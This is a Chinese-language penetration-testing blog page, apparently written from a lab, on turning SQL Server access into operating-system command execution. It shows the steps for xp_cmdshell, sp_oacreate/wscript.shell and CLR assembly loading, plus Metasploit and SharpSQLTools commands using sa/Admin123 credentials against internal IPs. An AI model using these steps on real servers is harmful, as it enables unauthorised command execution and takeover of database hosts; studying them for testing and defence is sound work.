@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-serif-sc@5.0.0/700.css"><link rel="stylesheet" href="/assets/theme.css?v=7e48d4fc"><script defer src="/assets/app.js?v=7e48d4fc"></script>
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/237383456?v=4&size=200"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="前期渗透可以参考SQL server口令爆破
+
+“存储过程”：其实质就是一个“集合”，那么是什么样的集合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。">
+<meta property="og:title" content="SQL server命令执行">
+<meta property="og:description" content="前期渗透可以参考SQL server口令爆破
+
+“存储过程”：其实质就是一个“集合”，那么是什么样的集合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://P7IVESC.github.io/post/SQL%20server-ming-ling-zhi-xing.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/237383456?v=4&size=200">
+<title>SQL server命令执行</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">SQL server命令执行</h1>
+<div class="title-right">
+    <a href="https://P7IVESC.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/P7IVESC/P7IVESC.github.io/issues/14" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>前期渗透可以参考SQL server口令爆破</p>
+<p>“存储过程”：其实质就是一个“集合”，那么是什么样的集合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。而存储过程中的这些小脚本中，其危险性最高的“小脚本”就是扩展存储过程中的 “xp_cmdshell脚本”，它可以执行操作系统的任何指令。</p>
+<h2>xp_cmdshell</h2>
+<h2>1.检查xp_cmdshell是否开启</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> <span class="pl-c1">sys</span>.<span class="pl-c1">configurations</span> <span class="pl-k">WHERE</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>xp_cmdshell<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0b7e8a47e6dd623736f64d0cdde31e99bcfea07c5a7ab678420404522cd0a5ad/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3934346238643761636636312e706e67"><img src="https://camo.githubusercontent.com/0b7e8a47e6dd623736f64d0cdde31e99bcfea07c5a7ab678420404522cd0a5ad/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3934346238643761636636312e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/944b8d7acf61.png" style="max-width: 100%;"></a></p>
+<h2>2.开启xp_cmdshell</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">EXEC sp_configure <span class="pl-s"><span class="pl-pds">'</span>show advanced options<span class="pl-pds">'</span></span>, <span class="pl-c1">1</span>; 
+RECONFIGURE; 
+EXEC sp_configure <span class="pl-s"><span class="pl-pds">'</span>xp_cmdshell<span class="pl-pds">'</span></span>, <span class="pl-c1">1</span>; 
+RECONFIGURE;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/98fa8e3d19a58d94028e8d314f862d6aa1fc11b8cfe0e0c5d6c0674067a832bf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3831323636613764333464622e77656270"><img src="https://camo.githubusercontent.com/98fa8e3d19a58d94028e8d314f862d6aa1fc11b8cfe0e0c5d6c0674067a832bf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3831323636613764333464622e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/81266a7d34db.webp" style="max-width: 100%;"></a></p>
+<h2>3.命令执行</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">master..xp_cmdshell <span class="pl-s"><span class="pl-pds">'</span>whoami<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8fd4a97b4bfa50b9bb2b5e92bb506c212fc121f9c065eeb776969970811ddc65/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6634633032393765343866322e706e67"><img src="https://camo.githubusercontent.com/8fd4a97b4bfa50b9bb2b5e92bb506c212fc121f9c065eeb776969970811ddc65/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6634633032393765343866322e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f4c0297e48f2.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e20af57f224d7665fcbcd44118b7e352f04ac467b92ae005bcbbc9bc4424aeb0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3639643031363761383162352e706e67"><img src="https://camo.githubusercontent.com/e20af57f224d7665fcbcd44118b7e352f04ac467b92ae005bcbbc9bc4424aeb0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3639643031363761383162352e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/69d0167a81b5.png" style="max-width: 100%;"></a></p>
+<h2>msf模块 auxiliary/admin/mssql/mssql_exec</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">msf <span class="pl-k">&gt;</span> use auxiliary<span class="pl-k">/</span>admin<span class="pl-k">/</span>mssql<span class="pl-k">/</span>mssql_exec
+msf auxiliary(admin<span class="pl-k">/</span>mssql<span class="pl-k">/</span>mssql_exec) <span class="pl-k">&gt;</span> <span class="pl-k">set</span> RHOSTS <span class="pl-c1">10</span>.<span class="pl-c1">3</span>.<span class="pl-c1">4</span>.<span class="pl-c1">119</span>
+RHOSTS <span class="pl-k">=&gt;</span> <span class="pl-c1">10</span>.<span class="pl-c1">3</span>.<span class="pl-c1">4</span>.<span class="pl-c1">119</span>
+msf auxiliary(admin<span class="pl-k">/</span>mssql<span class="pl-k">/</span>mssql_exec) <span class="pl-k">&gt;</span> <span class="pl-k">set</span> PASSWORD Admin123
+PASSWORD <span class="pl-k">=&gt;</span> Admin123
+msf auxiliary(admin<span class="pl-k">/</span>mssql<span class="pl-k">/</span>mssql_exec) <span class="pl-k">&gt;</span> run</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d001be133dd42e465fd1819b2c519ce897028d3665e520d3da9f02a100a89334/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6637613264303538326266612e77656270"><img src="https://camo.githubusercontent.com/d001be133dd42e465fd1819b2c519ce897028d3665e520d3da9f02a100a89334/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6637613264303538326266612e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f7a2d0582bfa.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/76bc09bedbede18209fc1d1d34dcf1ad494bdc42149e47df0696a36586deeaf8/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6233356638373662346565372e706e67"><img src="https://camo.githubusercontent.com/76bc09bedbede18209fc1d1d34dcf1ad494bdc42149e47df0696a36586deeaf8/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6233356638373662346565372e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b35f876b4ee7.png" style="max-width: 100%;"></a></p>
+<h2>sp_oacreate</h2>
+<p>使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE</p>
+<p>对象），利用OLE对象的run方法执行系统命令。</p>
+<p>在oacreate的官方文档里明确指出了，如果要使用OLE对象，必须要开启 'Ole Automation Procedures'，</p>
+<p>也就是</p>
+<p>EXEC sp_configure 'Ole Automation Procedures', 1;</p>
+<p>执行这条语句前要执行</p>
+<p>EXEC sp_configure 'show advanced options', 1;</p>
+<h2>1.检查sp_oacreate是否开启</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> <span class="pl-c1">sys</span>.<span class="pl-c1">configurations</span> <span class="pl-k">WHERE</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>ole automation procedures<span class="pl-pds">'</span></span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/30aecfe4a18c05622a396ab457a5e2982aff83ebc97e8188fa1337ae5248db2c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6633633936346437333066332e706e67"><img src="https://camo.githubusercontent.com/30aecfe4a18c05622a396ab457a5e2982aff83ebc97e8188fa1337ae5248db2c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6633633936346437333066332e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f3c964d730f3.png" style="max-width: 100%;"></a></p>
+<h2>2.开启sp_oacreate</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">EXEC sp_configure <span class="pl-s"><span class="pl-pds">'</span>show advanced options<span class="pl-pds">'</span></span>, <span class="pl-c1">1</span>; 
+RECONFIGURE; 
+EXEC sp_configure <span class="pl-s"><span class="pl-pds">'</span>ole automation procedures<span class="pl-pds">'</span></span>, <span class="pl-c1">1</span>; 
+RECONFIGURE;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2bd869786f7d107ebf705cd454499dd5a6b48edcda37ce55ce0002dbf4a2ea5f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6562633036343339373531612e706e67"><img src="https://camo.githubusercontent.com/2bd869786f7d107ebf705cd454499dd5a6b48edcda37ce55ce0002dbf4a2ea5f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6562633036343339373531612e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ebc06439751a.png" style="max-width: 100%;"></a></p>
+<h2>3.执行命令</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span>使用sp_oacreate调用wscript.shell组件，将返回的对象存储到@shell变量中。</span>
+declare @shell <span class="pl-k">int</span> 
+exec sp_oacreate <span class="pl-s"><span class="pl-pds">'</span>wscript.shell<span class="pl-pds">'</span></span>,@shell output 
+<span class="pl-c"><span class="pl-c">--</span> 使用sp_oamethod 调用@shell对象中的Run方法，执行添加用户的命令，null是run方法的返回值，我们不需要用返回值，所以写null.</span>
+exec sp_oamethod @shell,<span class="pl-s"><span class="pl-pds">'</span>run<span class="pl-pds">'</span></span>,<span class="pl-k">null</span>,<span class="pl-s"><span class="pl-pds">'</span>c:<span class="pl-cce">\w</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\c</span>md.exe /c whoami &gt;C:<span class="pl-cce">\\</span>1.txt<span class="pl-pds">'</span></span></pre></div>
+<p>使用上述的sp_oacreate调用wscript.shell的run方法执行命令重定向</p>
+<p>输出到文件是没有回显的，但是wscript.shell还有一个exec方法能够直</p>
+<p>接获取输出，使得sp_oacreate方法执行命令能够回显内容</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 调用exec方法实现回显</span>
+declare @luan <span class="pl-k">int</span>,@exec <span class="pl-k">int</span>,@<span class="pl-k">text</span> <span class="pl-k">int</span>,@str <span class="pl-k">varchar</span>(<span class="pl-c1">8000</span>);
+exec sp_oacreate <span class="pl-s"><span class="pl-pds">'</span>{72C24DD5-D70A-438B-8A42-98424B88AFB8}<span class="pl-pds">'</span></span>,@luan output;     
+exec sp_oamethod @luan,<span class="pl-s"><span class="pl-pds">'</span>exec<span class="pl-pds">'</span></span>,@exec output,<span class="pl-s"><span class="pl-pds">'</span>cmd.exe /c whoami<span class="pl-pds">'</span></span>;
+exec sp_oamethod @exec, <span class="pl-s"><span class="pl-pds">'</span>StdOut<span class="pl-pds">'</span></span>, @<span class="pl-k">text</span> out;
+exec sp_oamethod @<span class="pl-k">text</span>, <span class="pl-s"><span class="pl-pds">'</span>readall<span class="pl-pds">'</span></span>, @str out
+<span class="pl-k">select</span> @str;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bf1087c397451de019cc3d8888abbf700c6b9081c1c166ac8b5e8627d53c3ade/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6463623839393566616461352e706e67"><img src="https://camo.githubusercontent.com/bf1087c397451de019cc3d8888abbf700c6b9081c1c166ac8b5e8627d53c3ade/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6463623839393566616461352e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dcb8995fada5.png" style="max-width: 100%;"></a></p>
+<h2>CLR利用</h2>
+<p>什么是CLR：</p>
+<p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server</p>
+<p>集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这</p>
+<p>意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和</p>
+<p>Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义</p>
+<p>聚合和流式表值函数。</p>
+<p>简单的说，可以看做成mssql的udf提权，不过可以直接使用16进制代码来创建自定义</p>
+<p>函数，不需要写文件，比较方便</p>
+<h2>1.MSSQL CLR功能默认关闭，利用以下语句启用</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">sp_configure <span class="pl-s"><span class="pl-pds">'</span>clr enabled<span class="pl-pds">'</span></span>, <span class="pl-c1">1</span> 
+GO 
+RECONFIGURE 
+GO</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/70c6cdb7f4b33533142cdc24a1f649e517eb632c9c0fb9fd81e24be01c0354fc/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3535636335383839343130632e706e67"><img src="https://camo.githubusercontent.com/70c6cdb7f4b33533142cdc24a1f649e517eb632c9c0fb9fd81e24be01c0354fc/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3535636335383839343130632e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/55cc5889410c.png" style="max-width: 100%;"></a></p>
+<h2>2.为了导入了不安全的程序集，我们还需要执行以下语句将数据库标记为安全。</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">ALTER</span> <span class="pl-k">DATABASE</span> master <span class="pl-k">SET</span> TRUSTWORTHY <span class="pl-k">ON</span></pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/36f28db9ee4545a793a12a597078efef5b68c60294d4896ff7ac85abb6d39450/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3538373365373731656138302e706e67"><img src="https://camo.githubusercontent.com/36f28db9ee4545a793a12a597078efef5b68c60294d4896ff7ac85abb6d39450/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3538373365373731656138302e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5873e771ea80.png" style="max-width: 100%;"></a></p>
+<h2>3.利用SQL语句导入程序集。</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate">CREATE ASSEMBLY [luan_exec] 
+<span class="pl-k">FROM</span> 0x4D5A9000030000000…… 
+WITH PERMISSION_SET <span class="pl-k">=</span> UNSAFE; 
+GO</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c6a0ed685a5bd503c97041d48fe77cc407e6c42d064b81964d03d2996aece409/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3563336130626537333763652e706e67"><img src="https://camo.githubusercontent.com/c6a0ed685a5bd503c97041d48fe77cc407e6c42d064b81964d03d2996aece409/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3563336130626537333763652e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5c3a0be737ce.png" style="max-width: 100%;"></a></p>
+<p>因为是共有靶场，可能已经有了</p>
+<h2>4.创建存储过程。</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">CREATE</span> <span class="pl-k">FUNCTION</span> <span class="pl-en">dbo</span>.shell(@exe <span class="pl-k">as</span> nvarchar(<span class="pl-c1">2000</span>),@arg <span class="pl-k">as</span> nvarchar(<span class="pl-c1">2000</span>)) 
+RETURNS nvarchar(<span class="pl-c1">2000</span>) 
+<span class="pl-k">AS</span> EXTERNAL NAME luan_exec.[<span class="pl-c1">luan</span>.<span class="pl-c1">cmd</span>].run 
+GO</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/71f7cf500d6865d224ba45549fc4b673e96bba3b6073e879f3009f5832007e8b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3632306432303134386437662e706e67"><img src="https://camo.githubusercontent.com/71f7cf500d6865d224ba45549fc4b673e96bba3b6073e879f3009f5832007e8b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3632306432303134386437662e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/620d20148d7f.png" style="max-width: 100%;"></a></p>
+<h2>5.执行命令。</h2>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> <span class="pl-c1">dbo</span>.<span class="pl-c1">shell</span>(<span class="pl-s"><span class="pl-pds">'</span>cmd.exe<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>/c whoami<span class="pl-pds">'</span></span>)</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2b138c94108b6350cf5501bc1d14a7614aa3489d3c63c0a3abc417a3ec403382/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3763306139663562626630632e706e67"><img src="https://camo.githubusercontent.com/2b138c94108b6350cf5501bc1d14a7614aa3489d3c63c0a3abc417a3ec403382/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3763306139663562626630632e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7c0a9f5bbf0c.png" style="max-width: 100%;"></a></p>
+<h2>综合工具 SharpSQLTools</h2>
+<p><a href="https://github.com/uknowsec/SharpSQLTools">https://github.com/uknowsec/SharpSQLTools</a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">.<span class="pl-cce">\S</span>harpSQLTools.exe 10.3.4.118 sa Admin123 master enable_clr</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a7b1119ab5738b8634324b413803d1ca7d127a6d25ef36ded723691a9af6fd06/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3732623864373262653837362e706e67"><img src="https://camo.githubusercontent.com/a7b1119ab5738b8634324b413803d1ca7d127a6d25ef36ded723691a9af6fd06/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3732623864373262653837362e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/72b8d72be876.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">.<span class="pl-cce">\S</span>harpSQLTools.exe 10.3.4.118 sa Admin123 master install_clr</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/67eae34fbdbd4e7b2c44153190f653a871c3e3d232fc59544aecfe2cce147138/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334376636333233303130612e706e67"><img src="https://camo.githubusercontent.com/67eae34fbdbd4e7b2c44153190f653a871c3e3d232fc59544aecfe2cce147138/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3334376636333233303130612e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/347f6323010a.png" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">.<span class="pl-cce">\S</span>harpSQLTools.exe 10.3.4.118 sa Admin123 master clr_exec whoami</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c2ba337732af1776f96dac7952190f19363a5f6170a49884fa401e23aa1d292b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6132306566643935333563322e706e67"><img src="https://camo.githubusercontent.com/c2ba337732af1776f96dac7952190f19363a5f6170a49884fa401e23aa1d292b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6132306566643935333563322e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a20efd9535c2.png" style="max-width: 100%;"></a></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://P7IVESC.github.io">P7IVESC's blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 